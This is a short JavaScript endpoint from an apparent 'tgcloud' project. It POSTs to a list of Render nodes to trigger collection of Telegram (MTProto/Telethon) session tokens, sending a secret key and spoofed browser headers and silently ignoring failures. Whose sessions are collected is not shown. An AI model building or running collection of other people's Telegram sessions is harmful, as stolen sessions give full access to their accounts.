// tgcloud/endpoints/collectTokens.js — Triggers MTProto Telethon session link collection on Render Standby
import { fetch } from 'sdk';
import { RENDER_NODES, SECRET_KEY, BROWSER_HEADERS } from '../lib/config.js';

export default async function (input, ctx) {
  let success = false;
  let targetNode = null;

  for (const rNode of RENDER_NODES) {
    try {
      const resp = await fetch(`${rNode}/collect-tokens?secret=${SECRET_KEY}`, {
        method: 'POST',
        headers: {
          ...BROWSER_HEADERS,
          'Authorization': `Bearer ${SECRET_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({})
      });
      if (resp.ok) {
        success = true;
        targetNode = rNode;
        break;
      }
    } catch (_) {}
  }

  return {
    ok: success,
    node: targetNode,
    timestamp: Date.now()
  };
}
